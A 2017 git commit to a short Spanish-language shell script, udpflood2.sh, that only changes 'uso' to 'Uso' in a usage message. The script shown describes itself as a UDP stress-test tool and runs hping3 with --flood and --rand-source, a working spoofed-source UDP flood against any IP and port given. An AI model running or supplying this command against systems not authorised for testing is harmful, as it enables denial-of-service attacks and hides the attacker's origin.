b0ef5c7c4274ad4efe93530aebe3d842625d7d8e
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2017-05-10 12:23:06 +0200

    Update udpflood2.sh

--- udpflood2.sh
+++ udpflood2.sh
@@ -2,6 +2,6 @@
 # Herramienta de test de stress UDP
 # (C) hackingyseguridad.com 2017
 echo UDP Flood con herramienta hping3
-echo "uso: ./udpflood2.sh IP Puerto_UDP"
+echo "Uso: ./udpflood2.sh IP Puerto_UDP"
 echo "Control + C para interrumpir"
 hping3 $1 -2 --rand-source -p $2 --flood -d 1440
